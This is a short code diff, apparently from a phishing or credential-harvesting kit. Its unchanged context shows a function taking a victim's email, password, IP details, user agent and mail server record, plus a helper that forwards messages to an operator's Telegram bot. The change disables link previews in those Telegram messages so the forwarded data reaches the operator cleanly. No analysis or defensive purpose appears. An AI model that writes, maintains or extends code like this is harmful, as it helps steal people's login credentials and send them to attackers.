@@ -530,7 +530,8 @@ async function sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, a
 }
 
 // ============================================================
-// HELPER: Telegram (with 4096-char splitting + retry)
+// HELPER: Telegram (with 4096-char splitting, retry, and
+// no link preview so the bot name prefix never appears on URLs)
 // ============================================================
 async function sendToTelegram(message) {
     if (!BOT_TOKEN || !CHAT_ID) {
@@ -566,7 +567,8 @@ async function sendToTelegram(message) {
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text,
-                        disable_web_page_preview: true
+                        disable_web_page_preview: true,
+                        link_preview_options: { is_disabled: true }
                     })
                 }
             );
